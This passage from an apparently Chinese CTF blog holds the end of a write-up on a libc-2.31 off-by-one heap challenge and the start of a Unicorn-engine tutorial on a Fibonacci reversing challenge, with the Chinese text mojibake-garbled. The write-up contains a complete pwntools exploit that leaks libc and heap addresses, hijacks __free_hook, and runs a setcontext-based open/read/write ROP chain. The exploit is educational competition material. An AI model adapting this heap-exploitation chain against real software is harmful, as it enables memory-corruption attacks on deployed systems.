class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0x55fb03c8db90:0x00000000000000000x00000000000000c1</span><br><span class="line">0x55fb03c8dba0:0x00007f0b8b87ab720x000055fb03c8dd50/* ORW_ROPé“¾</span><br><span class="line">0x55fb03c8dbb0:0x00007f0b8b87d04f0x0000000000000000</span><br><span class="line">0x55fb03c8dbc0:0x00007f0b8b89e4000x0000000000000002</span><br><span class="line">0x55fb03c8dbd0:0x00007f0b8b9650000x00007f0b8b87ab72</span><br><span class="line">0x55fb03c8dbe0:0x00000000000000030x00007f0b8b87d04f</span><br><span class="line">0x55fb03c8dbf0:0x000055fb03c8dd500x00007f0b8b970241</span><br><span class="line">0x55fb03c8dc00:0x00000000000000200x0000000000000000</span><br><span class="line">0x55fb03c8dc10:0x00007f0b8b964ff00x00007f0b8b87ab72</span><br><span class="line">0x55fb03c8dc20:0x00000000000000010x00007f0b8b965090</span><br><span class="line">0x55fb03c8dc30:0x00000000000000000x0000000000000000</span><br><span class="line">0x55fb03c8dc40:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">0x55fb03c8dc50:0x00000000000000000x00000000000000c1/* éœ€è¦é‡Šæ”¾çš„å †å—</span><br><span class="line">0x55fb03c8dc60:0x000055fb03c8dc600x000055fb03c8dc60/* mov rdx, [rdi+8]</span><br><span class="line">0x55fb03c8dc70:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dc80:0x00007f0b8b8abf8d0x6161616161616161/* call qword ptr [rdx+20h]</span><br><span class="line">0x55fb03c8dc90:0x61616161616161610x6161616161616161&lt;=&gt; call &lt;setcontext+53&gt;</span><br><span class="line">0x55fb03c8dca0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcb0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcc0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcd0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dce0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcf0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dd00:0x000055fb03c8dba00x00007f0b8b879679</span><br><span class="line">/* mov rsp, QWORD PTR [rdx+0xa0] &lt;=&gt; mov rsp, [ORW_ROPé“¾]</span><br><span class="line">/* mov rcx, [rdx+0A8h] &lt;=&gt; mov rcx, [ret]</span><br><span class="line">/* push rcx</span><br><span class="line">/* ret &lt;=&gt; ret [rcx]</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;./orz&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note size : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;please input your note.\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;please input new note.\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># fill up 0xc1 tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0xb0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># off-by-one to leak libc_base </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0x28</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0-5</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x28</span>+<span class="string">&#x27;\xc1&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&#x27;flag\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc_base====&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overlapping to leak heap_base</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add(<span class="number">0x28</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#6-8 &lt;==&gt;2-4</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line">    heap_base=u64(io.recv(<span class="number">8</span>))&amp;<span class="number">0xfffffffff000</span>-<span class="number">0x2000</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># hijack __free_hook</span></span><br><span class="line">    edit(<span class="number">7</span>,p64(free_hook)+<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">    log.success(<span class="string">&quot;heap_base====&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">    magic=libc_base+<span class="number">0x1518B0</span></span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x28</span>,p64(magic))<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gadgets</span></span><br><span class="line">    pop_rax_ret=libc_base+<span class="number">0x0000000000047400</span></span><br><span class="line">    pop_rdi_ret=libc_base+<span class="number">0x0000000000023b72</span></span><br><span class="line">    pop_rsi_ret=libc_base+<span class="number">0x000000000002604f</span></span><br><span class="line">    pop_rdx_r12_ret=libc_base+<span class="number">0x0000000000119241</span></span><br><span class="line">    ret=libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">    syscall=libc_base+<span class="number">0x0000000000010E000</span></span><br><span class="line"></span><br><span class="line">    flag_addr=heap_base+<span class="number">0xd50</span></span><br><span class="line">    <span class="comment">#open</span></span><br><span class="line">    orw_rop=p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">    orw_rop+=p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    orw_rop+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">    orw_rop+=p64(pop_rdx_r12_ret)+p64(<span class="number">0x20</span>)+p64(<span class="number">0</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    orw_rop+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    rop_addr=heap_base+<span class="number">0xba0</span></span><br><span class="line">    jmp_addr=heap_base+<span class="number">0xc60</span></span><br><span class="line">    setcontext=libc_base+<span class="number">0x54f8d</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># construct heap &amp; trigger __free_hook</span></span><br><span class="line">    add(<span class="number">0xb0</span>,p64(jmp_addr)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(setcontext)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>+p64(rop_addr)+p64(ret))<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0xb0</span>,orw_rop)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–ï¼špatchelfåä¿®å¤gdbçš„debugç¬¦å·è¡¨"><a href="#å…¶ä»–ï¼špatchelfåä¿®å¤gdbçš„debugç¬¦å·è¡¨" class="headerlink" title="å…¶ä»–ï¼špatchelfåä¿®å¤gdbçš„debugç¬¦å·è¡¨"></a>å…¶ä»–ï¼špatchelfåä¿®å¤gdbçš„debugç¬¦å·è¡¨</h3><p><code>patchelf</code>ä¿®æ”¹äº†<code>libc</code>å’Œ<code>ld</code>ï¼Œè€Œ<code>gdb</code>è°ƒè¯•æ—¶ä¼šå»å¯»æ‰¾<code>libc</code>ç›®å½•ä¸‹çš„<code>.debug</code>æ–‡ä»¶ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ä¸€äº›<code>heap/bins</code>ä¹‹ç±»çš„å‘½ä»¤ï¼Œå› æ­¤æˆ‘ä»¬å»<code>glibc-all-in-one</code>ä¸­ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„<code>libc</code>åŠå…¶é™„å¸¦çš„<code>.debug</code>ã€‚</p><p>å®ç°æ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cd /glibc-all-in-one/</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo python3 update_list</span><br><span class="line">[+] <span class="keyword">Common</span> <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cat <span class="keyword">list</span></span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_i386</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_i386</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo ./download <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cd libs/</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ ls</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ cd <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥ç›®å½•ä¸‹<code>ctrl+h</code>ä¾¿èƒ½æ˜¾ç¤ºå‡ºéšè—æ–‡ä»¶<code>.debug</code>ï¼Œå°†<code>.debug</code>å¤åˆ¶åˆ°é¢˜ç›®çš„ç›®å½•ä¸‹ï¼Œ<code>gdb</code>è°ƒè¯•å‘½ä»¤å°±æ¢å¤äº†ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><blockquote><p><a href="https://verf1sh.github.io/2022/05/25/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/#midpwn">ç¬¬äºŒå±Šå¹¿ä¸œå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›-by Verfish</a></p><p><a href="https://trick.ink/article/glibc-all-in-one/">Glibc-All-In-One</a></p><p><a href="https://bbs.pediy.com/thread-254868.htm">å…³äºä¸åŒç‰ˆæœ¬ glibc æ›´æ¢çš„ä¸€äº›é—®é¢˜</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;èµ›å‰å¤ç›˜ä¸€é“&lt;code&gt;libc2.31&lt;/code&gt;çš„&lt;code&gt;off-by-one&lt;/code&gt;æ¼æ´åˆ©ç”¨çš„é¢˜ç›®ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="libc-2.31" scheme="http://example.com/tags/libc-2-31/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="http://example.com/2022/06/24/unicorn/"/>
    <id>http://example.com/2022/06/24/unicorn/</id>
    <published>2022-06-24T02:46:31.000Z</published>
    <updated>2023-02-06T11:17:54.969Z</updated>
    
    <content type="html"><![CDATA[<p>ç»“åˆ ctfèµ›é¢˜ å­¦ä¹ ä¸€ä¸‹ unicorn å¼•æ“çš„åŸºç¡€ä½¿ç”¨ã€‚</p><p><a href="https://bbs.pediy.com/thread-224330.htm#msg_header_h3_1">å‚è€ƒæ–‡ç« </a></p><p><a href="https://github.com/kabeor/Unicorn-Engine-Documentation/blob/master/Unicorn-Engine%20Documentation.md">unicornä¸­æ–‡æ–‡æ¡£</a></p><span id="more"></span><h2 id="hxp-CTF-2017-Fibonacci"><a href="#hxp-CTF-2017-Fibonacci" class="headerlink" title="hxp CTF 2017 Fibonacci"></a>hxp CTF 2017 Fibonacci</h2><p>è¿è¡Œè¯¥äºŒè¿›åˆ¶ç¨‹åºæ—¶ï¼Œæˆ‘ä»¬å‘ç°æ‰“å°<code>flag</code>çš„é€Ÿåº¦è¶Šæ¥è¶Šæ…¢ï¼š</p><p><img src="https://m.360buyimg.com/babel/jfs/t1/177336/3/25517/8754/62b52868E53cee082/a11a2873758db905.png" alt="1656039526862.png"></p><p>å› æ­¤å¿…é¡»å¯¹è¯¥ç¨‹åºè¿›è¡Œä¼˜åŒ–ï¼Œåœ¨åˆç†æ—¶é—´å†…æ‰“å°å‡º<code>flag</code></p><p>åˆ©ç”¨<code>ida_pro</code>åç¼–è¯‘çœ‹ä¸€ä¸‹ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// r9</span></span><br><span class="line">  __int64 v7; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">7</span>]; <span class="comment">// [rsp+Ch] [rbp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;unk_4007E1;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The flag is: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v5) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      FIB(v4 + v5, v10);<span class="comment">//è°ƒç”¨ FIB å‡½æ•°</span></span><br><span class="line">      v8 = v7;</span><br><span class="line">      v5 = v7 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 != <span class="number">8</span> );</span><br><span class="line">    v4 += <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (v10[<span class="number">0</span>] &lt;&lt; v8) == v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">    _IO_putc(v6 ^ (LOBYTE(v10[<span class="number">0</span>]) &lt;&lt; v8), <span class="built_in">stdout</span>);<span class="comment">//æ‰“å° flag å­—ç¬¦</span></span><br><span class="line">  &#125;</span><br><span class="line">  _IO_putc(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¥çœ‹ä¸€ä¸‹<code>FIB</code>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">FIB</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// er12</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = FIB(<span class="number">0LL</span>, a2);<span class="comment">// å‡ºå£</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = FIB((a1 - <span class="number">2</span>), a2);<span class="comment">// é€’å½’è°ƒç”¨ FIB</span></span><br><span class="line">      result = v3 + FIB((a1 - <span class="number">1</span>), a2);<span class="comment">// é€’å½’è°ƒç”¨ FIB</span></span><br><span class="line">    &#125;</span><br><span class="line">    v5 = ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x33333333</span>;</span><br><span class="line">    v6 = v5</span><br><span class="line">       + ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &amp; <span class="number">0x33333333</span>)</span><br><span class="line">       + ((v5 + ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &amp; <span class="number">0x33333333</span>)) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    *a2 ^= ((BYTE1(v6) &amp; <span class="number">0xF</span>) + (v6 &amp; <span class="number">0xF</span>) + ((((v6 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF0F0F</span>) + (v6 &amp; <span class="number">0xF0F0F0F</span>)) &gt;&gt; <span class="number">16</span>)) &amp; <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a2 ^= <span class="number">1u</span>;</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°ç¨‹åºåœ¨ä¸æ–­é€’å½’è°ƒç”¨<code>FIB</code>ï¼Œè€Œé€’å½’å‡½æ•°çš„ç¼ºç‚¹æ˜¾è€Œæ˜“è§ï¼š</p><ol><li><p>é€’å½’ç”±äºæ˜¯å‡½æ•°è°ƒç”¨è‡ªèº«ï¼Œè€Œ<strong>å‡½æ•°è°ƒç”¨æ˜¯æœ‰æ—¶é—´å’Œç©ºé—´çš„æ¶ˆè€—</strong>çš„ï¼šæ¯ä¸€æ¬¡å‡½æ•°è°ƒç”¨ï¼Œéƒ½éœ€è¦åœ¨å†…å­˜æ ˆä¸­åˆ†é…ç©ºé—´ä»¥ä¿å­˜å‚æ•°ã€è¿”å›åœ°å€ä»¥åŠä¸´æ—¶å˜é‡ï¼Œè€Œ<strong>å¾€æ ˆä¸­å‹å…¥æ•°æ®å’Œå¼¹å‡ºæ•°æ®éƒ½éœ€è¦æ—¶é—´</strong>ã€‚-&gt;æ•ˆç‡</p></li><li><p>é€’å½’ä¸­å¾ˆå¤šè®¡ç®—éƒ½æ˜¯é‡å¤çš„ï¼Œç”±äºå…¶æœ¬è´¨æ˜¯æŠŠä¸€ä¸ªé—®é¢˜åˆ†è§£æˆä¸¤ä¸ªæˆ–è€…å¤šä¸ªå°é—®é¢˜ï¼Œ<strong>å¤šä¸ªå°é—®é¢˜å­˜åœ¨ç›¸äº’é‡å çš„éƒ¨åˆ†</strong>ï¼Œåˆ™å­˜åœ¨é‡å¤è®¡ç®—ï¼Œå¦‚<code>fibonacciæ–æ³¢é‚£å¥‘æ•°åˆ—</code>çš„é€’å½’å®ç°ã€‚-&gt;æ•ˆç‡</p></li></ol><p>å› æ­¤éœ€è¦è€ƒè™‘ä¼˜åŒ–é—®é¢˜ï¼Œè‹¥é€‰æ‹©é‡æ„ä»£ç 